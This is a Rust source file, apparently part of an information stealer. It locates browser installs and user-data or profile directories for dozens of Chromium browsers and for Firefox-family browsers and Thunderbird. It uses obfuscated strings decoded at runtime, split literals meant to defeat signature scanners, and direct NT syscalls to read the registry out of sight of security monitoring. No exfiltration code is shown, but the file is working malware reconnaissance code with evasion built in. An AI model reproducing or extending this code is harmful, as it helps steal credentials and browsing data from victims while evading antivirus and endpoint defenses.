use std::collections::HashMap;
use std::path::PathBuf;
use std::ffi::c_void;

use kurion_core::common::t_wide;
use kurion_sys::internal_api::{
    n_open_key_syscall, n_query_value_key_syscall, n_close_syscall,
    i_object_attributes,
    UNICODE_STRING_SYSCALLS, OBJECT_ATTRIBUTES, OBJ_CASE_INSENSITIVE,
    KEY_VALUE_PARTIAL_INFORMATION_CLASS, KEY_VALUE_PARTIAL_INFORMATION,
    STATUS_BUFFER_TOO_SMALL, STATUS_BUFFER_OVERFLOW,
};

include!(concat!(env!("OUT_DIR"), "/obf_browser_strings.rs"));

#[inline(always)]
fn d(data: &[u8]) -> String {
    crate::deobf(data)
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct BrowserInfo {
    pub browser_type: String,
    pub exe_name: String,
    pub full_path: PathBuf,
    pub display_name: String,
    pub version: String,
}

pub struct BrowserDiscovery;

impl BrowserDiscovery {
    #[cfg(windows)]
    pub fn f_all() -> Vec<BrowserInfo> {
        let browser_map = Self::g_browser_map();
        let mut results = Vec::new();

        for (browser_type, (exe_name, display_name)) in &browser_map {
            if let Some(path) = Self::r_path(browser_type, exe_name) {
                let version = Self::g_file_version(&path).unwrap_or_default();
                results.push(BrowserInfo {
                    browser_type: browser_type.clone(),
                    exe_name: exe_name.clone(),
                    full_path: path,
                    display_name: display_name.clone(),
                    version,
                });
            }
        }
        results
    }

    #[cfg(windows)]
    pub fn f_specific(browser_type: &str) -> Option<BrowserInfo> {
        let lower = browser_type.to_lowercase();
        let browser_map = Self::g_browser_map();
        let (exe_name, display_name) = browser_map.get(&lower)?;

        let path = Self::r_path(&lower, exe_name)?;
        let version = Self::g_file_version(&path).unwrap_or_default();

        Some(BrowserInfo {
            browser_type: lower,
            exe_name: exe_name.clone(),
            full_path: path,
            display_name: display_name.clone(),
            version,
        })
    }

    fn g_browser_map() -> HashMap<String, (String, String)> {
        let mut map = HashMap::new();
        map.insert(d(BS_CHROME),      (d(BS_EXE_CHROME),   d(BS_NAME_CHROME)));
        map.insert(d(BS_CHROME_BETA), (d(BS_EXE_CHROME),   d(BS_NAME_CHROME_BETA)));
        map.insert(d(BS_EDGE),        (d(BS_EXE_EDGE),      d(BS_NAME_EDGE)));
        map.insert(d(BS_BRAVE),       (d(BS_EXE_BRAVE),     d(BS_NAME_BRAVE)));
        map.insert(d(BS_OPERA),       (d(BS_EXE_OPERA),     d(BS_NAME_OPERA)));
        map.insert(d(BS_OPERA_GX),    (d(BS_EXE_OPERA),     d(BS_NAME_OPERA_GX)));
        map.insert(d(BS_VIVALDI),     (d(BS_EXE_VIVALDI),   d(BS_NAME_VIVALDI)));
        map.insert(d(BS_YANDEX),      (d(BS_EXE_BROWSER),   d(BS_NAME_YANDEX)));
        map
    }

    #[cfg(windows)]
    fn r_path(browser_type: &str, exe_name: &str) -> Option<PathBuf> {
        let s_chrome      = d(BS_CHROME);
        let s_chrome_beta = d(BS_CHROME_BETA);
        let s_edge        = d(BS_EDGE);
        let s_brave       = d(BS_BRAVE);
        let s_opera       = d(BS_OPERA);
        let s_opera_gx    = d(BS_OPERA_GX);
        let s_vivaldi     = d(BS_VIVALDI);
        let s_yandex      = d(BS_YANDEX);
        let s_install     = d(BS_VAL_INSTALL);

        if browser_type != s_chrome && browser_type != s_chrome_beta {
            let app_paths = [
                format!("{}{}", d(BS_APP_PATHS_32), exe_name),
                format!("{}{}", d(BS_APP_PATHS_64), exe_name),
            ];
            for reg_path in app_paths {
                if let Some(path) = Self::q_registry(&reg_path) {
                    let p = PathBuf::from(&path);
                    if p.exists() {
                        return Some(p);
                    }
                }
            }
        }

        let alt_registry: Vec<(String, String)> = if browser_type == s_chrome {
            vec![
                (d(BS_REG_CHROME_1), s_install.clone()),
                (d(BS_REG_CHROME_2), s_install.clone()),
                (d(BS_REG_CHROME_3), String::new()),
            ]
        } else if browser_type == s_chrome_beta {
            vec![
                (d(BS_REG_CHROME_BETA_1), s_install.clone()),
                (d(BS_REG_CHROME_BETA_2), s_install.clone()),
                (d(BS_REG_CHROME_BETA_3), String::new()),
            ]
        } else if browser_type == s_edge {
            vec![
                (d(BS_REG_EDGE_1), s_install.clone()),
                (d(BS_REG_EDGE_2), s_install.clone()),
                (d(BS_REG_EDGE_3), String::new()),
            ]
        } else if browser_type == s_brave {
            vec![
                (d(BS_REG_BRAVE_1), s_install.clone()),
                (d(BS_REG_BRAVE_2), s_install.clone()),
                (d(BS_REG_BRAVE_3), String::new()),
            ]
        } else if browser_type == s_opera {
            vec![
                (d(BS_REG_OPERA_1), s_install.clone()),
                (d(BS_REG_OPERA_2), s_install.clone()),
            ]
        } else if browser_type == s_opera_gx {
            vec![
                (d(BS_REG_OPERA_GX_1), s_install.clone()),
                (d(BS_REG_OPERA_GX_2), s_install.clone()),
            ]
        } else if browser_type == s_vivaldi {
            vec![
                (d(BS_REG_VIVALDI_1), s_install.clone()),
                (d(BS_REG_VIVALDI_2), s_install.clone()),
                (d(BS_REG_VIVALDI_3), String::new()),
            ]
        } else if browser_type == s_yandex {
            vec![
                (d(BS_REG_YANDEX_1), s_install.clone()),
                (d(BS_REG_YANDEX_2), s_install.clone()),
            ]
        } else {
            vec![]
        };

        for (key, value) in alt_registry {
            if let Some(result) = Self::q_registry_value(&key, &value) {
                let full_path = if value == s_install {
                    PathBuf::from(&result).join(exe_name)
                } else {
                    let clean = result.trim_matches('"');
                    PathBuf::from(clean)
                };
                if full_path.exists() {
                    return Some(full_path);
                }
            }
        }

        let common_paths: Vec<PathBuf> = {
            use std::env;
            let mut paths = vec![];
            if browser_type == s_opera_gx {
                if let Ok(local) = env::var("LOCALAPPDATA") {
                    paths.push(PathBuf::from(&local).join("Programs").join("Opera GX").join(exe_name));
                }
                if let Ok(appdata) = env::var("APPDATA") {
                    paths.push(PathBuf::from(&appdata).join(d(BS_OPERA_SOFTWARE)).join(d(BS_OPERA_GX_DIR)).join(exe_name));
                }
            } else if browser_type == s_opera {
                if let Ok(appdata) = env::var("APPDATA") {
                    paths.push(PathBuf::from(&appdata).join(d(BS_OPERA_SOFTWARE)).join(d(BS_NAME_OPERA)).join(exe_name));
                }
                if let Ok(local) = env::var("LOCALAPPDATA") {
                    paths.push(PathBuf::from(&local).join("Programs").join("Opera").join(exe_name));
                }
            } else if browser_type == s_vivaldi {
                if let Ok(local) = env::var("LOCALAPPDATA") {
                    paths.push(PathBuf::from(&local).join(d(BS_NAME_VIVALDI)).join("Application").join(exe_name));
                }
                if let Ok(pf) = env::var("ProgramFiles") {
                    paths.push(PathBuf::from(&pf).join(d(BS_NAME_VIVALDI)).join("Application").join(exe_name));
                }
            }
            paths
        };

        for path in common_paths {
            if path.exists() {
                return Some(path);
            }
        }

        None
    }

    #[cfg(windows)]
    fn q_registry(key_path: &str) -> Option<String> {
        Self::q_registry_value(key_path, "")
    }

    #[cfg(windows)]
    fn q_registry_value(key_path: &str, value_name: &str) -> Option<String> {
        unsafe {
            let mut key_path_wide = t_wide(key_path);
            let mut unicode_key_name = UNICODE_STRING_SYSCALLS {
                length: ((key_path_wide.len() - 1) * 2) as u16,
                maximum_length: (key_path_wide.len() * 2) as u16,
                buffer: key_path_wide.as_mut_ptr(),
            };

            let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
            i_object_attributes(
                &mut obj_attr,
                &mut unicode_key_name,
                OBJ_CASE_INSENSITIVE,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );

            let mut h_key: *mut c_void = std::ptr::null_mut();
            let status = n_open_key_syscall(
                &mut h_key,
                0x00020019,
                &mut obj_attr,
            );

            if status.0 != 0 {
                return None;
            }

            let _handle_guard = HandleGuard(h_key);

            let mut value_name_wide = t_wide(value_name);
            let mut unicode_value_name = UNICODE_STRING_SYSCALLS {
                length: ((value_name_wide.len() - 1) * 2) as u16,
                maximum_length: (value_name_wide.len() * 2) as u16,
                buffer: value_name_wide.as_mut_ptr(),
            };

            let mut buffer_size = 4096u32;
            let mut buffer = vec![0u8; buffer_size as usize];
            let mut result_length = 0u32;

            let mut status = n_query_value_key_syscall(
                h_key,
                if value_name.is_empty() { std::ptr::null_mut() } else { &mut unicode_value_name },
                KEY_VALUE_PARTIAL_INFORMATION_CLASS,
                buffer.as_mut_ptr() as *mut c_void,
                buffer_size,
                &mut result_length,
            );

            if status == STATUS_BUFFER_TOO_SMALL || status == STATUS_BUFFER_OVERFLOW {
                buffer_size = result_length;
                buffer.resize(buffer_size as usize, 0);
                status = n_query_value_key_syscall(
                    h_key,
                    if value_name.is_empty() { std::ptr::null_mut() } else { &mut unicode_value_name },
                    KEY_VALUE_PARTIAL_INFORMATION_CLASS,
                    buffer.as_mut_ptr() as *mut c_void,
                    buffer_size,
                    &mut result_length,
                );
            }

            if status.0 != 0 {
                return None;
            }

            let info = &*(buffer.as_ptr() as *const KEY_VALUE_PARTIAL_INFORMATION);

            if info.type_ != 1 && info.type_ != 2 {
                return None;
            }

            let data_ptr = buffer.as_ptr().add(std::mem::size_of::<u32>() * 3);

            let char_count = (info.data_length as usize) / 2;
            if char_count == 0 { return None; }

            let slice = std::slice::from_raw_parts(data_ptr as *const u16, char_count);
            let mut s = String::from_utf16_lossy(slice);

            if s.ends_with('\0') {
                s.pop();
            }

            Some(s)
        }
    }

    #[cfg(windows)]
    fn g_file_version(_path: &PathBuf) -> Option<String> {
        None
    }

    #[cfg(not(windows))]
    pub fn f_all() -> Vec<BrowserInfo> { Vec::new() }
    #[cfg(not(windows))]
    pub fn f_specific(_t: &str) -> Option<BrowserInfo> { None }
    #[cfg(not(windows))]
    fn r_path(_t: &str, _e: &str) -> Option<PathBuf> { None }
    #[cfg(not(windows))]
    fn q_registry(_k: &str) -> Option<String> { None }
    #[cfg(not(windows))]
    fn q_registry_value(_k: &str, _v: &str) -> Option<String> { None }
}

struct HandleGuard(*mut c_void);
impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            let _ = n_close_syscall(self.0);
        }
    }
}

pub fn g_chromium_browsers() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    #[cfg(windows)]
    {
        use std::env;
        let local = env::var("LOCALAPPDATA").unwrap_or_default();
        let roaming = env::var("APPDATA").unwrap_or_default();

        if local.is_empty() && roaming.is_empty() { return paths; }

        let local_path = PathBuf::from(&local);
        let roaming_path = PathBuf::from(&roaming);

        let g = ["Goo","gle"].concat();
        let bs = ["Brave","Software"].concat();
        let ms = ["Micro","soft"].concat();
        let yn = ["Yan","dex"].concat();
        let os_vendor = ["Opera ","Soft","ware"].concat();

        let list = [
            local_path.join(&g).join(["Chr","ome"].concat()),
            local_path.join(&g).join(["Chr","ome SxS"].concat()),
            local_path.join(["Chrom","ium"].concat()),
            local_path.join(&bs).join(["Brave","-Browser"].concat()),
            local_path.join(&ms).join("Edge"),
            local_path.join(&yn).join(["Yandex","Browser"].concat()),
            roaming_path.join(&os_vendor).join(["Opera"," Stable"].concat()),
            roaming_path.join(&os_vendor).join(["Opera ","GX Stable"].concat()),
            local_path.join(["Ami","go"].concat()),
            local_path.join(["Tor","ch"].concat()),
            local_path.join(["Kom","eta"].concat()),
            local_path.join(["Orb","itum"].concat()),
            roaming_path.join(["Com","odo"].concat()).join(["Dra","gon"].concat()),
            local_path.join(["Cent","Browser"].concat()),
            local_path.join(["7St","ar"].concat()).join(["7St","ar"].concat()),
            local_path.join(["Sput","nik"].concat()).join(["Sput","nik"].concat()),
            local_path.join(["Viv","aldi"].concat()),
            local_path.join(["At","om"].concat()),
            local_path.join(["Max","thon"].concat()),
            roaming_path.join(["Max","thon3"].concat()),
            local_path.join(["AcWeb","Browser"].concat()),
            local_path.join(["Epic ","Privacy Browser"].concat()),
            local_path.join(["uCoz","Media"].concat()).join(["Ur","an"].concat()),
            local_path.join(["Coc","Coc"].concat()).join(["Brow","ser"].concat()),
            local_path.join(["Elements"," Browser"].concat()),
            local_path.join(["Irid","ium"].concat()),
            roaming_path.join(["360","Browser"].concat()).join(["Brow","ser"].concat()),
            roaming_path.join(["Mail",".Ru"].concat()).join(["At","om"].concat()),
        ];

        for p in list {
            if p.exists() {
                paths.push(p);
            }
        }
    }
    paths
}

pub fn g_gecko_browsers() -> Vec<PathBuf> {
    #[allow(unused_assignments)]
    let mut paths = Vec::new();
    #[cfg(windows)]
    {
        use std::env;
        use std::collections::HashMap;

        let roaming = env::var("APPDATA").unwrap_or_default();
        let program_files = env::var("ProgramFiles").unwrap_or_default();
        let program_files_x86 = env::var("ProgramFiles(x86)").unwrap_or_default();

        let roaming_path = PathBuf::from(&roaming);
        let pf_path = PathBuf::from(&program_files);
        let pf_x86_path = PathBuf::from(&program_files_x86);

        let mut browser_map: HashMap<String, PathBuf> = HashMap::new();

        let appdata_browsers = [
            (["Fire","fox"].concat(), roaming_path.join(["Moz","illa"].concat()).join(["Fire","fox"].concat())),
            (["Z","en"].concat(), roaming_path.join("zen")),
            (["Water","fox"].concat(), roaming_path.join(["Water","fox"].concat())),
            (["K-Mel","eon"].concat(), roaming_path.join(["K-Mel","eon"].concat())),
            (["Thunder","bird"].concat(), roaming_path.join(["Thunder","bird"].concat())),
            (["Ice","Dragon"].concat(), roaming_path.join(["Com","odo"].concat()).join(["Ice","Dragon"].concat())),
            (["Cyber","fox"].concat(), roaming_path.join(["8pecx","studios"].concat()).join(["Cyber","fox"].concat())),
            (["Pale"," Moon"].concat(), roaming_path.join(["Moonchild"," Productions"].concat()).join(["Pale"," Moon"].concat())),
            (["Black","Hawk"].concat(), roaming_path.join(["NETGATE"," Technologies"].concat()).join(["Black","Hawk"].concat())),
            (["Sea","Monkey"].concat(), roaming_path.join(["Moz","illa"].concat()).join(["Sea","Monkey"].concat())),
        ];

        for (name, path) in appdata_browsers {
            if path.exists() {
                browser_map.insert(name, path);
            }
        }

        if !program_files.is_empty() {
            let pf_browsers = [
                (["Fire","fox"].concat(), pf_path.join(["Mozilla"," Firefox"].concat())),
                (["Z","en"].concat(), pf_path.join(["Zen"," Browser"].concat())),
                (["Water","fox"].concat(), pf_path.join(["Water","fox"].concat())),
                (["Libre","Wolf"].concat(), pf_path.join(["Libre","Wolf"].concat())),
                (["Firefox"," Dev"].concat(), pf_path.join(["Firefox Dev","eloper Edition"].concat())),
            ];

            for (name, path) in pf_browsers {
                if path.exists() && !browser_map.contains_key(&name) {
                    browser_map.insert(name, path);
                }
            }
        }

        if !program_files_x86.is_empty() {
            let pf_x86_browsers = [
                (["Fire","fox"].concat(), pf_x86_path.join(["Mozilla"," Firefox"].concat())),
                (["Z","en"].concat(), pf_x86_path.join(["Zen"," Browser"].concat())),
                (["Water","fox"].concat(), pf_x86_path.join(["Water","fox"].concat())),
                (["Libre","Wolf"].concat(), pf_x86_path.join(["Libre","Wolf"].concat())),
            ];

            for (name, path) in pf_x86_browsers {
                if path.exists() && !browser_map.contains_key(&name) {
                    browser_map.insert(name, path);
                }
            }
        }

        paths = browser_map.into_values().collect();
    }
    paths
}

pub fn f_gecko_profiles(browser_path: &PathBuf) -> Vec<PathBuf> {
    let mut profiles = Vec::new();

    let profiles_root = if browser_path.join("Profiles").exists() {
        browser_path.join("Profiles")
    } else {
        #[cfg(windows)]
        {
            use std::env;
            let roaming = env::var("APPDATA").unwrap_or_default();
            if roaming.is_empty() { return profiles; }

            let browser_name = browser_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("");

            let appdata_path = PathBuf::from(&roaming);
            let profile_base = match browser_name {
                n if n == ["Mozilla"," Firefox"].concat() || n == ["Firefox Dev","eloper Edition"].concat() => appdata_path.join(["Moz","illa"].concat()).join(["Fire","fox"].concat()),
                n if n == ["Zen"," Browser"].concat() => appdata_path.join("zen"),
                n if n == ["Water","fox"].concat() => appdata_path.join(["Water","fox"].concat()),
                n if n == ["Libre","Wolf"].concat() => appdata_path.join(["Libre","Wolf"].concat()),
                _ => appdata_path.join(browser_name),
            };

            profile_base.join("Profiles")
        }
        #[cfg(not(windows))]
        { return profiles; }
    };

    if !profiles_root.exists() {
        return profiles;
    }

    if let Ok(entries) = std::fs::read_dir(profiles_root) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_dir() {
                    let path = entry.path();
                    let path_str = path.to_string_lossy().to_lowercase();

                    if path_str.contains(".default-default")
                        || path_str.contains(".default-release")
                        || path_str.contains(".default (release)")
                        || path_str.ends_with(".default")
                        || path_str.contains(".default ") {
                        profiles.push(path);
                    }
                }
            }
        }
    }
    profiles
}

pub fn g_user_data_dir(browser_type: &str) -> Option<PathBuf> {
    #[cfg(windows)]
    {
        let local = std::env::var("LOCALAPPDATA").ok();
        let roaming = std::env::var("APPDATA").ok();
        let ud = d(BS_USER_DATA);

        let path = if browser_type == d(BS_CHROME) {
            PathBuf::from(local?).join(d(BS_VENDOR_GOOGLE)).join(d(BS_NAME_CHROME)).join(&ud)
        } else if browser_type == d(BS_CHROME_BETA) {
            PathBuf::from(local?).join(d(BS_VENDOR_GOOGLE)).join(d(BS_CHROME_BETA_DIR)).join(&ud)
        } else if browser_type == d(BS_EDGE) {
            PathBuf::from(local?).join(d(BS_VENDOR_MICROSOFT)).join(d(BS_NAME_EDGE)).join(&ud)
        } else if browser_type == d(BS_BRAVE) {
            PathBuf::from(local?).join(d(BS_VENDOR_BRAVE_SW)).join(d(BS_BRAVE_BROWSER)).join(&ud)
        } else if browser_type == d(BS_VIVALDI) {
            PathBuf::from(local?).join(d(BS_NAME_VIVALDI)).join(&ud)
        } else if browser_type == d(BS_YANDEX) {
            PathBuf::from(local?).join(d(BS_VENDOR_YANDEX_DIR)).join(d(BS_YANDEX_BROWSER)).join(&ud)
        } else if browser_type == d(BS_OPERA) {
            PathBuf::from(roaming?).join(d(BS_OPERA_SOFTWARE)).join(d(BS_NAME_OPERA))
        } else if browser_type == d(BS_OPERA_GX) {
            PathBuf::from(roaming?).join(d(BS_OPERA_SOFTWARE)).join(d(BS_OPERA_GX_DIR))
        } else {
            return None;
        };
        if path.exists() { Some(path) } else { None }
    }
    #[cfg(not(windows))]
    { None }
}
